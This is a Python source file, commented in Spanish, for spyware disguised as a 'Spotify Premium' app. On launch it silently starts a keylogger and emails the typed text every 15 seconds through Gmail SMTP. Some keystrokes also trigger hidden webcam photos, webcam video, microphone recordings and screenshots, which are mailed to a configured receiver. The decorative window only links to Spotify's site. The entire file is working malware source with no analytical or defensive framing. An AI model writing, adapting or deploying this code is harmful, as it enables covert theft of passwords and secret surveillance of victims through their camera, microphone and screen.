from pynput import keyboard
import threading
import tkinter as tk
import cv2
import queue
import os
import datetime
import time
import webbrowser
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
import mss
import mss.tools
import sounddevice as sd
import numpy as np
import wave

# === CONFIGURACIÓN EMAIL ===
SENDER_EMAIL = 'tu_correo_prueba@gmail.com'
SENDER_PASSWORD = 'tu_contraseña_app'
RECEIVER_EMAIL = 'tu_destino_prueba@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# === VARIABLES GLOBALES ===
key_queue = queue.Queue()
listener_thread = None
queue_thread = None
keylogger_running = False
stop_flag = threading.Event()
text_buffer = []
attachments = []

# === FUNCIÓN PARA TAREAS EN SEGUNDO PLANO ===
def run_in_background(target, *args, **kwargs):
    threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True).start()

# === FUNCIONES DE EMAIL ===
def send_email(subject, body, attachment_paths=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        if attachment_paths:
            for path in attachment_paths:
                filename = os.path.basename(path)
                with open(path, 'rb') as f:
                    data = f.read()
                if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                    part = MIMEImage(data)
                else:
                    part = MIMEApplication(data, Name=filename)
                part.add_header('Content-Disposition', 'attachment', filename=filename)
                msg.attach(part)
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print(f"Email enviado: {subject}")
    except Exception as e:
        print(f"Error email: {e}")

def send_text_email(text):
    text_buffer.append(text)

def send_image_email(path):
    attachments.append(path)

def send_video_email(path):
    attachments.append(path)

def send_combined_email():
    if not text_buffer and not attachments:
        return
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    subject = f"Reporte combinado - {timestamp}"
    body = "".join(text_buffer) if text_buffer else "Sin texto capturado"
    if attachments:
        body += f"\n\nAdjuntos: {len(attachments)} archivo(s)"
    send_email(subject, body, attachments)
    text_buffer.clear()
    attachments.clear()

# === FUNCIONES DE CÁMARA (AUTOAPERTURA Y CIERRE) ===
def take_photo():
    """Abre la cámara, toma una foto y la cierra inmediatamente."""
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("No se pudo abrir la cámara para la foto")
        return
    ret, frame = cam.read()
    if ret:
        os.makedirs("screenshots", exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        image_path = f"screenshots/camera_{timestamp}.png"
        cv2.imwrite(image_path, frame)
        send_image_email(image_path)
        print(f"Foto tomada y adjuntada: {image_path}")
    else:
        print("No se pudo leer imagen de la cámara")
    cam.release()
    print("Cámara apagada después de la foto")

def record_video(duration=4):
    """Abre la cámara, graba vídeo MP4 (duración 4s) y la cierra al terminar."""
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("No se pudo abrir la cámara para el vídeo")
        return
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    os.makedirs("screenshots", exist_ok=True)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    video_path = f"screenshots/video_{timestamp}.mp4"
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
    start_time = time.time()
    print(f"Grabando vídeo MP4 por {duration} segundos...")
    while time.time() - start_time < duration:
        ret, frame = cam.read()
        if ret:
            out.write(frame)
        else:
            break
    out.release()
    cam.release()
    send_video_email(video_path)
    print(f"Vídeo MP4 grabado y adjuntado: {video_path}")
    print("Cámara apagada después del vídeo")

# === FUNCIONES DE AUDIO ===
def grabar_audio(duracion=5, frecuencia=44100):
    """Graba audio del micrófono y lo guarda como WAV."""
    try:
        os.makedirs("audios", exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = f"audios/audio_{timestamp}.wav"
        print(f"🎤 Grabando audio por {duracion} segundos...")
        grabacion = sd.rec(int(duracion * frecuencia), samplerate=frecuencia, channels=1, dtype='int16')
        sd.wait()
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)   # 16 bits
            wf.setframerate(frecuencia)
            wf.writeframes(grabacion.tobytes())
        print(f"✅ Audio guardado: {audio_path}")
        return audio_path
    except Exception as e:
        print(f"❌ Error grabando audio: {e}")
        return None

def grabar_y_adjuntar_audio(duracion=5):
    path = grabar_audio(duracion)
    if path:
        send_image_email(path)  # se adjunta como cualquier otro archivo
        print("🔊 Audio adjuntado para el próximo envío.")

# === CAPTURA DE PANTALLA ===
def take_screenshot():
    with mss.mss() as sct:
        return sct.grab(sct.monitors[1])

def handle_enter():
    try:
        os.makedirs("screenshots", exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        image_path = f"screenshots/screenshot_{timestamp}.png"
        print(f"[*] Tomando screenshot: {image_path}")
        screenshot = take_screenshot()
        if screenshot:
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=image_path)
            print(f"[✓] Screenshot guardado")
            send_image_email(image_path)
            print(f"[✓] Screenshot enviado por email")
        else:
            print("[✗] No se pudo tomar screenshot")
    except Exception as e:
        print(f"[✗] Error en screenshot: {e}")

# === CAPTURA DE TECLAS ===
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char.lower()
            if char == 'd':
                run_in_background(take_photo)
                key_queue.put(key.char)
                return
            if char == 'e':
                run_in_background(record_video, 4)   # vídeo de 4 segundos
                key_queue.put(key.char)
                return
            if char == 'r':
                run_in_background(grabar_y_adjuntar_audio, 5)   # audio 5s
                key_queue.put(key.char)
                return
            key_queue.put(key.char)
        elif key == keyboard.Key.enter:
            key_queue.put("\n")
            run_in_background(handle_enter)
        elif key == keyboard.Key.space:
            key_queue.put(" ")
        elif key == keyboard.Key.tab:
            key_queue.put("\t")
        elif key == keyboard.Key.backspace:
            key_queue.put("[←]")
        else:
            key_queue.put(f"[{key.name}]")
    except Exception as e:
        print(f"Error capturando tecla: {e}")

def process_queue():
    while not stop_flag.is_set():
        if not key_queue.empty():
            text = "".join(key_queue.get() for _ in range(key_queue.qsize()))
            send_text_email(text)
        send_combined_email()
        threading.Event().wait(15)

# === FLUJO PRINCIPAL ===
def start_listener():
    global listener_thread, queue_thread, keylogger_running
    if keylogger_running:
        return
    stop_flag.clear()
    keylogger_running = True
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Inicio - {timestamp}", "\n--- Spotify Premium activado ---\n")
    listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run())
    queue_thread = threading.Thread(target=process_queue)
    listener_thread.start()
    queue_thread.start()

def stop_keylogger():
    global keylogger_running
    if not keylogger_running:
        return
    stop_flag.set()
    keylogger_running = False
    send_combined_email()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Fin - {timestamp}", "\n--- Spotify Premium cancelado ---\n")

def open_spotify_premium():
    webbrowser.open('https://www.spotify.com/premium/')

# === INTERFAZ GRÁFICA ===
def create_app():
    app = tk.Tk()
    app.title("Spotify Premium")
    app.geometry("500x350")
    app.configure(bg="#191414")
    tk.Label(app, text="🎵 Spotify", font=("Arial", 24, "bold"), bg="#191414", fg="white").pack(pady=10)
    tk.Label(app, text="Obtén Spotify Premium", font=("Arial", 18, "bold"), bg="#191414", fg="white").pack(pady=5)
    tk.Label(app, text="Disfruta de música ilimitada sin anuncios,\ndescarga tus canciones favoritas y más.",
             font=("Arial", 12), bg="#191414", fg="white", justify="center").pack(pady=10)
    tk.Button(app, text="Obtener Premium", command=open_spotify_premium,
              bg="#1DB954", fg="white", font=("Arial", 14, "bold"), width=20).pack(pady=10)
    start_listener()
    app.mainloop()

if __name__ == "__main__":
    create_app()